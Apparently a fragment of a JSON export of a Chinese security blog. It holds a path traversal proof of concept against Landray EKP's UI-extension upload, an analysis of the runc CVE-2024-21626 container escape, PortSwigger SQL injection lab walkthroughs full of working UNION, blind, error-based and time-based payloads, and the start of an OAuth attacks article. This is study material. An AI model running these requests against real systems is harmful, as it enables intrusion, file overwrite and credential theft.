extendFolder);\n\tResourceCacheListener.updateResourceCache();\n}\n所以到这里目标就很简单了，虽然不能直接通过压缩包进行目录穿越，但是可以在压缩包中放入一个 ui.ini 文件，其中 id 字段指定要目录穿越的位置。\n压缩包解压后存放位置\n从 upload 中的相关代码可知压缩包解压后存放目录为 System.getProperty(&quot;java.io.tmpdir&quot;) + 随机字符串(IDGenerator.generateID())。\nString folderPath = System.getProperty(&quot;java.io.tmpdir&quot;);\nif (!folderPath.endsWith(&quot;/&quot;) &amp;&amp; !folderPath.endsWith(&quot;\\\\&quot;)) {\n\tfolderPath = folderPath + &quot;/&quot;;\n}\n \nString folderName = IDGenerator.generateID();\nfolderPath = folderPath + folderName;\n从代码上看，压缩包解压后存放在哪里，并不重要。\n目录穿越的起点\nResourceUtil.KMSS_RESOURCE_PATH + &quot;/&quot; + &quot;ui-ext&quot; + &quot;/&quot; + extendId\nKMSS_RESOURCE_PATH 才是需要关注的重点，它的值由安装时的配置决定，本机测试时所在目录为 C:\\Ekp\\kmss。\nPoc\n假设 KMSS_RESOURCE_PATH 为 C:\\Ekp\\kmss\\resource\n下面构造一个 ui.ini 文件\nid=../../../ekp\n发送如下请求\nPOST /ekp/sys/ui/sys_ui_extend/sysUiExtend.do HTTP/1.1\nHost: 10.37.129.3:8080\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nContent-Length: 498\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary8Gi3f63ozQb3hai9\nCookie: JSESSIONID=2909AF801BF57FC2C0A8145B6EF34C99; LRToken=84e3da6d5adc9b1f787e0ad14d9a33729ad067218e6d43c643dd72407997c4f903a57f23de4fb2559f8b5a566709cb94e154c5c2cbfe0a4b06f3b60974d567b9aee4cb5ac37b801478fd944a964c426c20cfad6d0f72ec9811e358fbbb2bbddc007029c8d9f885e41e4ae4a37e0a42b922ed20c94a1a73e078b343d02a42e293\nOrigin: http://10.37.129.3:8080\nReferer: http://10.37.129.3:8080/ekp/sys/ui/help/lui-ext/upload.jsp\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\nX-Requested-With: XMLHttpRequest\n \n------WebKitFormBoundary8Gi3f63ozQb3hai9\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;poc.zip&quot;\nContent-Type: application/zip\n \n...\n------WebKitFormBoundary8Gi3f63ozQb3hai9--\n成功后在 ekp 目录会有一个 1.txt 文件\n\n其它方式\n除了 upload 方法，还有一个方法 getThemeInfo 可以实现相同的目的\npublic ActionForward getThemeInfo(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {\n\tresponse.setCharacterEncoding(&quot;UTF-8&quot;);\n\tJSONObject rtnJson = new JSONObject();\n \n\ttry {\n\t\tSysUiExtendForm mainForm = (SysUiExtendForm)form;\n\t\tJSONObject jsonInfo = this.getSysUiExtendService().checkExtend(mainForm.getFile()); // [4] 检查压缩包\n\t\tString extendId = jsonInfo.getString(&quot;extendId&quot;);\n\t\tjsonInfo.getString(&quot;extendName&quot;);\n\t\tString folderName = jsonInfo.getString(&quot;folderName&quot;);\n\t\tString thumbnail = jsonInfo.getString(&quot;thumbnail&quot;);\n\t\tString folderPath = System.getProperty(&quot;java.io.tmpdir&quot;);\n\t\tif (!folderPath.endsWith(&quot;/&quot;) &amp;&amp; !folderPath.endsWith(&quot;\\\\&quot;)) {\n\t\t\tfolderPath = folderPath + &quot;/&quot;;\n\t\t}\n \n\t\tfolderPath = folderPath + folderName;\n\t\tFile appThemeFolder = new File(this.getAppFolder(extendId));\n\t\tFileUtils.copyDirectory(new File(folderPath), appThemeFolder); // [5] 复制到指定目录\n此方法中拷贝路径略有不同，查看 this.getAppFolder(extendId)\nprivate String getAppFolder(String extendId) {\n\treturn ConfigLocationsUtil.getWebContentPath() + &quot;/&quot; + &quot;resource/ui-ext&quot; + &quot;/&quot; + extendId;\n}\n目的路径为 ConfigLocationsUtil.getWebContentPath() + &quot;/&quot; + &quot;resource/ui-ext&quot; + &quot;/&quot; + extendId，这一点和 upload 方法是不同的，ConfigLocationsUtil.getWebContentPath() 的值就是 web 应用的部署路径，在这里是 C:\\Ekp\\ekp，此时 ui.ini 文件构造如下\nid=../../\n\n此外还有一个方法 replaceExtend，这里不赘述了。\npublic void replaceExtend(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {\n\tresponse.setCharacterEncoding(&quot;UTF-8&quot;);\n\tif (UserOperHelper.allowLogOper(&quot;Base_UrlParam&quot;, null)) {\n\t\tUserOperHelper.setModelNameAndModelDesc(\n\t\t\tnull, ResourceUtil.getString(&quot;sys-admin:home.nav.sysAdmin&quot;) + &quot;(&quot; + ResourceUtil.getString(&quot;sys-ui:ui.extend.replace&quot;) + &quot;)&quot;\n\t\t);\n\t}\n \n\tString extendId = request.getParameter(&quot;extendId&quot;);\n\tString folderName = request.getParameter(&quot;folderName&quot;);\n\tif (StringUtil.isNotNull(extendId) &amp;&amp; StringUtil.isNotNull(folderName)) {\n\t\ttry {\n\t\t\tboolean bool = this.getSysUiExtendService().replaceExtend(request);\n \npublic boolean replaceExtend(HttpServletRequest request) throws Exception {\n\tString extendId = request.getParameter(&quot;extendId&quot;);\n\tString folderName = request.getParameter(&quot;folderName&quot;);\n\tboolean bool = this.deleteExtendDirectory(extendId);\n\tif (bool) {\n\t\tthis.saveExtend(extendId, folderName);\n\t}\n \n\treturn bool;\n}"},"articles/security/vulnerabilities/runc-容器逃逸漏洞分析（CVE-2024-21626）":{"title":"runc 容器逃逸漏洞分析（CVE-2024-21626）","links":[],"tags":["CVE-2024-21626"],"content":"记录对 bestwing.me/CVE-2024-21626-container-escape.html 这篇分析文章的学习，原文中有很多错别字，以及不太了解的概念，导致看着有点费劲，故重新梳理一下。\n先来了解一些 Linux 系统相关的前置知识\n\n/proc/self 目录是内核提供的，用于便捷查询进程自身状态的文件，它存在于内存中。如果想查看指定进程的目录，则可访问 /proc/&lt;pid&gt;。\n\n而 /proc/self/fd/... 则对应着进程自身打开的文件描述符，某些情况下，也会包含父进程打开的文件描述符。这是导致该漏洞产生的一个重要原因。\n\n\nopenat2 系统调用可用于打开文件，若成功则返回文件描述符，该调用支持的选项更加丰富。其支持的 O_CLOEXEC 标志的作用在于避免在多进程的程序中，打开的文件描述符无意间泄露给子进程。\n\nint openat2(int dirfd, const char *pathname, \n\t\t\tconst struct open_how *how, size_t size);\n漏洞产生的原因有多个：\n\n在早期的一个 commit 中，引入了打开 /proc/self/cgroup 文件的操作\n在后续的 commit 中，打开 /proc/self/cgroup 文件的操作被移至 prepareOpennat2() 中且未设置 O_CLOEXEC 标志。但函数并且未正确关闭文件描述符，也没有返回打开的文件描述符。\n\nfunc prepareOpenat2() error {\n\tprepOnce.Do(func() {\n\t    // cgroupfsDir = &quot;/sys/fs/cgroup&quot;\n\t\tfd, err := unix.Openat2(-1, cgroupfsDir, &amp;unix.OpenHow{\n\t\t\tFlags: unix.O_DIRECTORY | unix.O_PATH,\n\t\t})\n\t\tif err != nil {\n\t\t\tprepErr = &amp;os.PathError{Op: &quot;openat2&quot;, Path: cgroupfsDir, Err: err}\n\t\t\tif err != unix.ENOSYS { //nolint:errorlint // unix errors are bare\n\t\t\t\tlogrus.Warnf(&quot;falling back to securejoin: %s&quot;, prepErr)\n\t\t\t} else {\n\t\t\t\tlogrus.Debug(&quot;openat2 not available, falling back to securejoin&quot;)\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t\tvar st unix.Statfs_t\n\t\tif err = unix.Fstatfs(fd, &amp;st); err != nil {\n\t\t\tprepErr = &amp;os.PathError{Op: &quot;statfs&quot;, Path: cgroupfsDir, Err: err}\n\t\t\tlogrus.Warnf(&quot;falling back to securejoin: %s&quot;, prepErr)\n\t\t\treturn\n\t\t}\n \n\t\tcgroupFd = fd\n \n\t\tresolveFlags = unix.RESOLVE_BENEATH | unix.RESOLVE_NO_MAGICLINKS\n\t\tif st.Type == unix.CGROUP2_SUPER_MAGIC {\n\t\t\t// cgroupv2 has a single mountpoint and no &quot;cpu,cpuacct&quot; symlinks\n\t\t\tresolveFlags |= unix.RESOLVE_NO_XDEV | unix.RESOLVE_NO_SYMLINKS\n\t\t}\n\t})\n \n\treturn prepErr\n}\n\n当通过 runc exec(run) 创建子进程执行命令时，子进程可获取父进程泄露的指向 /proc/self/cgroup 的文件描述符 /proc/self/fd/&lt;id&gt; （id 取决于具体执行环境） 。从而导致子进程可通过访问 /proc/self/fd/&lt;id&gt; 在子进程中访问父进程所在空间的文件。而 runc 父进程处于主机环境，exec(run) 命令被 Docker 等工具用于创建容器（子进程），从而导致容器可逃逸访问主机中的文件。复现过程如下\n\n\n怎么 /proc/self/fd/&lt;id&gt; 中的 id？原文中给出了方法，其中 437 是 openat2 的系统调用编号\nstrace -ff -y -e trace=437 -p $(pidof /usr/bin/containerd)\n之后在另一个终端运行一个容器，此处测试的结果为 7。\n\n此方法不适用于在已创建的容器上执行 docker exec，因为 openat2 打开 sys/fs/cgroup 的操作在容器创建过程中才会触发。\n\ndocker run -it --rm nginx /bin/sh\n\n参考\n\nwww.man7.org/linux/man-pages/man2/openat.2.html openant2 的说明文档\ngithub.com/opencontainers/runc/commit/2a4ed3e75b9e80d93d1836a9c4c1ebfa2b78870e 补丁\ngithub.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv 漏洞通告\nsnyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/ snyk 发布的漏洞概述文章\n"},"articles/security/web/Business-Logic-Vulnerabilities":{"title":"Business Logic Vulnerabilities","links":[],"tags":[],"content":""},"articles/security/web/SQL-Injection":{"title":"SQL Injection","links":[],"tags":["sql","injection"],"content":"SQL 注入的危害\n注入成功可能导致，未授权情况下获取敏感信息，如密码，身份卡等或其他个人信息。在特定条件下甚至可以执行命令，上传恶意文件，从而注入 Webshell 或后门。\nSQL 注入示例\nportswigger 上列举了一些例子\n\n获取本不该出现的数据\n修改应用逻辑\nUNION 查询\n获取数据库的信息，如版本，表结构\n盲注，此时不会有明显的回显\n\nRetrieving Hidden Data\n比如某个网站接口如下\ninsecure-website.com/products\n其背后逻辑为，获取 category 参数内容，并拼接到 SQL 语句中执行。\nSELECT * FROM products WHERE category = &#039;Gifts&#039; AND released = 1\n如果执行成功会将结果返回到页面之中，这条语句限定了另一个条件 released = 1。那么可以通过下面的方式让它获取所有 category = ‘Gifts’ 的数据。\ninsecure-website.com/products#039;--\n这是因为 -- 为注释符，所以后面的条件不会生效。\n再进一步，想获取 category 为任意值时的信息呢？通过或语句，让条件一直为真\ninsecure-website.com/products#039;+OR+1=1--\n+ 号上分隔符，作用类似空格或制表符。\n而最终执行的 SQL 语句如下\nSELECT * FROM products WHERE category = &#039;Gifts&#039; OR 1=1--&#039; AND released = 1\nSubverting Application Logic\n假设某个网站通过下面这样的 SQL 语句来判断用户的账户名和密码是否为正确的，执行结果不为空则可以登录，反之不行\nSELECT * FROM users WHERE username = &#039;wiener&#039; AND password = &#039;bluecheese&#039;\n那么按照前面的方式，可以修改 username 对应的参数，让它执行如下语句\nSELECT * FROM users WHERE username = &#039;administrator&#039;--&#039; AND password = &#039;&#039;\n那么就可以不需要密码登录 administrator 账号\nRetrieving Data from other Database Tables\nSQL 语句中，可以通过 UNION 来联合查询另一张表的数据，并合并到结果中，但是要求所查询的列数据类型是兼容的。\nSELECT name, description FROM products WHERE category = &#039;Gifts&#039;\n那么让参数 category 的内容为\n&#039; UNION SELECT username, password FROM users--\n这样执行的语句为\nSELECT name, description FROM products WHERE category = &#039;&#039; UNION SELECT username, password FROM users--\n就可以获取所有的用户名和密码数据了。\nExamining the Database\n如果能够进行 SQL 注入，可以通过数据库\b自身的特性获取它的一些信息。由于数据库提供商较多，对于 Oracle\nSELECT * FROM v$version\n可以获取版本号\n而 MySQL 则可以像下面这样\nSELECT * FROM information_schema.tables\nBlind SQL Injection Vulnerabilities\n前面列举的情况在这个时代是难以碰到的，大多数情况下，即便是可注入的点也不会有回显。\n那么对于这种情况，基于漏洞本身的和数据库的特点，可以通过一些方式进行试探性的注入。\n比如，通过让目标系统执行 SQL 语句时带上附加条件，达成时间盲注，或报错等。或是使用 OAST 技术进行测试。\nLabs\nLab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data\n\n目标：需要取回所有没有 released 商品信息，使用如下注入语句\nGET /filter?category={{urlescape(Pets&#039; or 1=1 and released = 0 --)}} HTTP/1.1\n\nLab 2: SQL Injection Vulnerability Allowing Login Bypass\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/lab-login-bypass\n\n目标：以 administrator 用户身份登陆。\n猜测内部查询语句为\nselect * from user where username=&#039;xxx&#039; and password=&#039;xxx&#039;\n\n在 username 前，修改注入语句的逻辑，让条件为真，构造如下请求\n\n注意需要提供 session 和 csrf token，另外在 Yakit 的 WebFuzzer 中提交请求后虽然出现了 302，但跟随重定向不会 Solve 这个 Lab ，需要复制 cookie 并在浏览器中打开后修改邮件地址。\n\nPOST /login HTTP/1.1\nHost: 0a6e003404d174b28063539700880075.web-security-academy.net\nConnection: keep-alive\nContent-Length: 85\nCache-Control: max-age=0\nOrigin: 0a6e003404d174b28063539700880075.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nCookie: session=79u2w5Oky0VXWeOiAd4jrlyRlnNPm4JK\n \ncsrf=ig8qzUsJKKKhaYl8MRVjUnnKiyGPCcOW&amp;username=administrator%27+or+1%3D1--&amp;password=1\nLab 3: Lab: SQL Injection Attack, Querying the Database Type and Version on Oracle\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle\n\n目标：联合查询读取数据库信息\nGET /filter?category={{urlescape(Gifts&#039; union select banner,null from v$version--)}} HTTP/1.1\nHost: 0aa600a803b4377080c435d400df00d4.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nCookie: session=yF7hkPrbZIxX4MUDh8jK5eVca3fwXJjo\n思路，category 参数 &#039; 测试会报错，通过 order by 测试列数，为 2。通过 Cheat Sheet，尝试读取 v$instance 的 version 但报错『&#039; union select version,null from v$instance--』，这个表大概率只有一列，尝试读取 v$version 成功。\nLab 4: SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft\n\n目标：读取数据库版本\nGET /filter?category=Accessories%27%20union%20select%20@@version,%20null-- HTTP/1.1\nHost: 0ace003303e650c8823f51af00ea007f.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nCookie: session=DCMQEesA2rUZaenI8GMhR70lXTGxQfKP\nLab 5: SQL Injection Attack, Listing the Database Contents on non-Oracle Databases\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle\n\n目标：以 administrator 用户身份登陆。\n思路，盲猜是 mysql，确定列数后读取版本，但是报错，尝试通过读取 information_schema.tables 获取更多信息。\n\n可以确定是 PostgreSQL\n继续读取 information_schema.tables，但筛除系统中的表\nGET /filter?category={{urlescape(Pets&#039; union select table_name,NULL from information_schema.tables where table_name not like &#039;pg%&#039;--)}} HTTP/1.1\n从结果中，搜索 user 相关的表，有 4 个，逐个尝试至 users_mqbatw\nGET /filter?category={{urlescape(Pets&#039; union select table_name, column_name from information_schema.columns where table_name = &#039;users_mqbatw&#039;--)}} HTTP/1.1\n列信息如下\n\n使用 union 查询读取 users_mqbatw 的信息\nGET /filter?category={{urlescape(Pets&#039; union select username_idvhxr,password_xwrmtt from users_mqbatw--)}} HTTP/1.1\n\nLab 6: SQL Injection Attack, Listing the Database Contents on Oracle\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle\n\n目标：以 administrator 用户身份登陆。\n已提示为 Orcale 数据库，读取所有表\nGET /filter?category={{urlescape(Gifts&#039; union select table_name, null from all_tables--)}} HTTP/1.1\n猜测为 USERS_ERQOPU，读取列信息\nGET /filter?category={{urlescape(Gifts&#039; union select table_name, COLUMN_NAME from all_tab_columns where table_name=&#039;USERS_ERQOPU&#039;--)}} HTTP/1.1\n\n根据列信息读取该表\nGET /filter?category={{urlescape(Gifts&#039; union select USERNAME_MZPSUJ, PASSWORD_CXJVFV from USERS_ERQOPU--)}} HTTP/1.1\n\nLab 7: SQL Injection UNION Attack, Determining the Number of Columns Returned by the Query\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns\n\n目标：确定查询返回的列的数量\n首先确认数据库类型，尝试之后确认为 PostgreSQL，直接注入即可。\nGET /filter?category={{urlescape(Gifts&#039; union select null, null, null--)}}\nLab 8: SQL Injection UNION Attack, Finding a Column Containing Text\n\n\n                  \n                  Info\n                  \n                \n链接 0ac3006c04e38a1888e2f1770085004a.web-security-academy.net/\n\n目标：确定查询结果返回的数据类型，并让查询结果返回特定 flag value，\n确定列数\nGET /filter?category={{urlescape(Lifestyle&#039; order by 3--)}}\n测试列的类型，找到类型为字符串的列，为第 2 列\nGET /filter?category={{urlescape(Lifestyle&#039; union select null,&#039;a&#039;,null--)}} HTTP/1.1\n根据提示内容，需要返回字符串 &#039;PKbRlH&#039;\n\n发送如下请求\nGET /filter?category={{urlescape(Lifestyle&#039; union select null, &#039;PKbRlH&#039;, null--)}} HTTP/1.1\nLab 9: SQL Injection UNION Attack, Retrieving Data from other Tables\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables\n\n目标：读取用户表，以 administrator 身份登陆\n解决过程和前面是类似的，不赘述，找到的表名为 users\nGET /filter?category={{urlescape(Gifts&#039; union select null,table_name from information_schema.tables where table_name not like &#039;pg%&#039;--)}} HTTP/1.1\n读取该表\nGET /filter?category={{urlescape(Gifts&#039; union select username,password from users--)}} HTTP/1.1\n\nLab 10: SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column\n\n目标：读取用户表，以 administrator 身份登陆\n已经提示了表名和列名，测试发现只有一列的类型是字符串，需要将两列的结果拼接在一起\nGET /filter?category={{urlescape(Gifts&#039; union select  null, username || &#039;~&#039; || password from users--)}} HTTP/1.1\n\nLab 11: Blind SQL Injection with Conditional Responses\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/blind/lab-conditional-responses\n\n目标：读取用户表，以 administrator 身份登陆\n与前面类似，但是是盲注，无回显注入点位于 Cookie 中的 TrackingId=si7cWehMEcOZOY7j，注意页面中的 Welcome back!，修改 TrackingId 后就没有这段文本了。\n\n唯一能获得的回显特征是 Welcome back!。可以尝试 TrackingId=si7cWehMEcOZOY7j &#039; or &#039;1&#039;=&#039;1 和 TrackingId=si7cWehMEcOZOY7j &#039; and &#039;2&#039;=&#039;1 来确认。\n\n所以需要根据响应内容的不同来判断盲注的结果是否正确。\n已经提示了列名、表名和用户名，那么需要猜测用户名对应的密码，可以通过二分查找的逻辑逐个爆破密码字符，首先先确认密码的长度，确认长度为 20\nGET / HTTP/1.1\nCookie: TrackingId=si7cWehMEcOZOY7j&#039; and (select &#039;a&#039; from users where username=&#039;administrator&#039; and length(password) &gt; 20)=&#039;a;\n确定长度为 19，下面猜测密码中每一位的内容，这部分过程手工十分低效且枯燥\nGET / HTTP/1.1\nCookie: TrackingId=si7cWehMEcOZOY7j&#039; and substring((select password from users where username=&#039;administrator&#039;),1,1)=&#039;a;\n下面使用 Yakit 的模糊测试功能进行爆破，选中 a 后右键 →插入标签和字典 →插入临时字典，填入 ascii 英文字母和数字之后进行爆破，同时选中数字 1，进行相同操作，但填入数字 1 至 19，\nGET / HTTP/1.1\nCookie: TrackingId=si7cWehMEcOZOY7j&#039; and substring((select password from users where username=&#039;administrator&#039;),{{int(1-20)}},1)=&#039;{{file:line(/Users/trganda/yakit-projects/temp/tmp1165100010.txt)}}; session=pCYf6TdkVFJkmgXmkZ059YeJvDjEohEh\n得到的密码为\nvh2ecqg1g8nyjs16thqi\n\nLab 12: Blind SQL Injection with Conditional Errors\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/blind/lab-conditional-errors\n\n目的：读取用户表，以 administrator 身份登陆\n与前面不同，无论后端返回的查询结果中的数据是怎样的，页面的响应结果都不会变化。但是当查询语句出现错误的时候，却会有一点不同。\n为了让语句出错，使用整除 0，\n\nCASE 语句类型编程语言中的 If\n\n(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#039;a&#039; END)=&#039;a\n(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#039;a&#039; END)=&#039;a\n尝试上述语句，会发现两者响应都是 500，猜测为 Orcale，需要添加 FROM DUAL\n\n接下来就通过该特征来判断盲注的结果，在 Yakit 中使用以下请求\n\n注意 Orcale 中需要使用 SUBSTR\n\nGET / HTTP/1.1\nCookie: TrackingId=XytKjQAUwTQLulJS&#039; and (select case when (substr(password, {{int(1-20)}}, 1) = &#039;{{file:line(C:\\Users\\Trganda\\yakit-projects\\temp\\tmp1535641307.txt)}}&#039;) then to_char(1/0) else &#039;a&#039; end from users where username = &#039;administrator&#039;)=&#039;a; session=MlAZ4LT4ohF3P9zhr4cGZrWnCEg1JxAe\n最后得到的密码为\nz66fpty25y2eww01t469\n\nLab 13: Visible Error-based SQL Injection\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based\n\n目的：读取用户表，以 administrator 身份登陆\n测试发现 Cookie 中的 TrackingId 存在注入，会产生如下错误\n\n由此得到 SQL 语句的形式为\nSQL SELECT * FROM tracking WHERE id = &#039;xxx&#039;\n但现在需要读取 users 表，只能借助这个报错信息来得到查询的内容，经过测速发现为 PostgreSQL\nGET /filter?category=Pets HTTP/1.1\nCookie: TrackingId=8q3CTJgzvYlSIbua&#039; || CAST((select version()) AS int)--; session=BZlPiDvsfEwGPFgKaO5yQhwndNe1b5Du\n\n为此，构造如下语句\nGET /filter?category=Pets HTTP/1.1\nCookie: TrackingId=8q3CTJgzvYlSIbua&#039; || CAST((SELECT password FROM users LIMIT 1) AS int) || &#039;;\n但提示如下错误\nUnterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = &#039;8q3CTJgzvYlSIbua&#039; || CAST((SELECT password FROM users LIMIT &#039;. Expected  char\n\nLab 14: Blind SQL Injection with time Delays\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/blind/lab-time-delays\n\n目标：对目标网站进行延迟注入，时间为 10 秒\n由于已知提示，所以直接对 Cookie 参数进行延迟注入，逐个测速，以下 payload 有效\nGET / HTTP/1.1\nCookie: TrackingId=5ccKuLVmuLOOuYQz&#039; || pg_sleep(10)--; session=Xs8L4HKOulVlZx2QFiCycq17uzTjpiA2\nLab 15: Blind SQL Injection with time Delays and Information Retrieval\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval\n\n目标：通过延迟注入，读取用户表，以 administrator 身份登陆\n逐个测试，确认 pg_sleep(10) 有效\nLab 16: Blind SQL Injection with Out-of-band Interaction\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/blind/lab-out-of-band\n\n目的：通过 OAST 注入，触发 DNS 查询来验证注入的存在\n社区版本用不了 Burp Collaborator，跳过。\nLab 17: SQL Injection with Filter Bypass via XML Encoding\n\n\n                  \n                  Info\n                  \n                \n链接 portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding\n\n目的：读取用户表，以 administrator 身份登陆\n测试发现以下接口存在注入\nPOST /product/stock HTTP/1.1\n \n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;stockCheck&gt;&lt;productId&gt;7&lt;/productId&gt;&lt;storeId&gt;1{{htmlenc(--)}}&lt;/storeId&gt;&lt;/stockCheck&gt;\n通过 UNION 查询读取 users 表，并逐个测试密码\nPOST /product/stock HTTP/1.1\n \n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;stockCheck&gt;&lt;productId&gt;7&lt;/productId&gt;&lt;storeId&gt;1{{htmlenc( union select password from users--)}}&lt;/storeId&gt;&lt;/stockCheck&gt;\n\n如何发现 SQL 注入\n常见的方式有\n\n使用单引号作为参数\n使用 SQL 语法中的一些关键字\n使用 SQL 的与或关系\n使用基于时间 SQL 语句进行盲注\n使用 OAST 形式的 payload\n\n并观察回显内容变化。\nSQL 注入的形式\nSQL 注入也可能发生在其它形式的参数重，例如 Web 应用中常用的 XML 或 Json 数据，比如下面这个例子，其中使用了 xml 转义字符来表示字母 S\n&lt;stockCheck&gt;\n    &lt;productId&gt;\n        123\n    &lt;/productId&gt;\n    &lt;storeId&gt;\n        999 &amp;#x53;ELECT * FROM information_schema.tables\n    &lt;/storeId&gt;\n&lt;/stockCheck&gt;\n而后台处理 XML 数据的逻辑会对转义字符进行解码再交给后续逻辑。\nSecond-order SQL Injection（二次注入）\n这里还是使用它的英文名称 Second-order SQL injection 叭，业内中文的翻译及容易让人误解。可以把前面列举的 SQL 注入看作 First-order SQL Injection，应用将用户的参数以各种情况拼接到 SQL 语句中执行并导致不安全的行为发生。\n而 Second-order 是指，在进行第一次注入时，内容并不会被执行，而是存储在某个地方，比如数据库之中。当某个人，比如攻击者，比如用户访问了某个页面或使用某些功能时，第一次注入的数据被取出并放入 SQL 语句之中被执行。\n\n数据库特性\n不同的数据库，由于自身特点，在进行 SQL 注入时会有不同的利用方法。这些可能时独一无二。\n\nSQL injection cheat sheet | Web Security Academy (portswigger.net)\nSQL Injection - HackTricks\n\n如何避免 SQL 注入\n以下是代码开发的角度\n常见的解决方案是，参数化查询。大多数的数据库接口或代码库都支持这种方式\n以 Java 语言为例，下面是一段⚠️的代码\nString query = &quot;SELECT * FROM products WHERE category = &#039;&quot;+ input + &quot;&#039;&quot;;\nStatement statement = connection.createStatement();\nResultSet resultSet = statement.executeQuery(query);\n而可以通过下面这样改为参数化查询\nPreparedStatement statement = connection.prepareStatement(&quot;SELECT * FROM products WHERE category = ?&quot;);\nstatement.setString(1, input);\nResultSet resultSet = statement.executeQuery();\n参数化查询能防护 SQL 注入的原因，在于它的原理是先对 SQL 语句进行编译并进行缓存，也就是说没发改变它的执行逻辑。之后在执行语句时，会将参数进行替换，而此时参数内容即便放入符合 SQL 语法点语句也不会被执行，而是被看作指定类型的参数。\n参数化查询原理_王如霜的博客-CSDN博客_sql参数化查询原理\nReference\n\nWhat is SQL Injection? Tutorial &amp; Examples | Web Security Academy (portswigger.net)\nSQL injection cheat sheet | Web Security Academy (portswigger.net)\nwww.postgres.cn/docs/9.3/infoschema-columns.html 『PostgreSQL infoschema-columns 表』\ndocs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html 『Oracle ALL_TABLES 表』\n"},"articles/security/web/oauth/OAuth-Attacks":{"title":"OAuth Attacks","links":["articles/security/web/oauth/OAuth-Labs","articles/security/web/oauth/OAuth---Abusing-OAuth-to-take-over-millions-of-accounts"],"tags":["oauth","csrf"],"content":"OAuth Authorization Code 模式回顾\nAuthorization Code 授权模式的大致流程如下，注意其中未使用 state 参数，各个请求阶段相对独立而无状态。\n@startuml\nskinparam Shadowing true\nskinparam sequenceMessageAlign direction\nparticipant User\nparticipant Client\nparticipant AuthServer\nparticipant ResourceServer\nautonumber\nUser -&gt; Client: &quot;GET /peek&quot;\nactivate User\nactivate Client\n \nClient -&gt; User : &quot;302: Location=auth/authorize&quot;\ndeactivate Client\ndeactivate User\n \nUser -&gt; AuthServer: &quot;GET /authorize&quot;\nactivate User\nactivate AuthServer\n \nAuthServer -&gt; User: &quot;{messages: &quot;Do you approve?&quot;}&quot;\ndeactivate User\ndeactivate AuthServer\n \nUser -&gt; AuthServer: &quot;approve&quot;\nactivate User\nactivate AuthServer\n \nAuthServer -&gt; User: &quot;302: Location=clien/handle_code?code=random_code&quot;\ndeactivate User\ndeactivate AuthServer\n \nUser -&gt; Client: &quot;GET /handle_code?code=randome_code&quot;\nactivate User\nactivate Client\n \nClient -&gt; AuthServer: &quot;POST /token?code=randome_code&quot;\nactivate AuthServer\n \nAuthServer -&gt; Client: &quot;200: {access_token=random_token}&quot;\ndeactivate AuthServer\n \nClient -&gt; ResourceServer: &quot;GET /resource?token=access_token&quot;\nactivate ResourceServer\n \nResourceServer -&gt; Client: &quot;200: respoonse&quot;\ndeactivate ResourceServer\n \nClient -&gt; User: &quot;200: result&quot;\ndeactivate User\ndeactivate Client\n@enduml\nOAuth 下的安全问题\n\nHTTP 是无状态协议，需要通过 Session 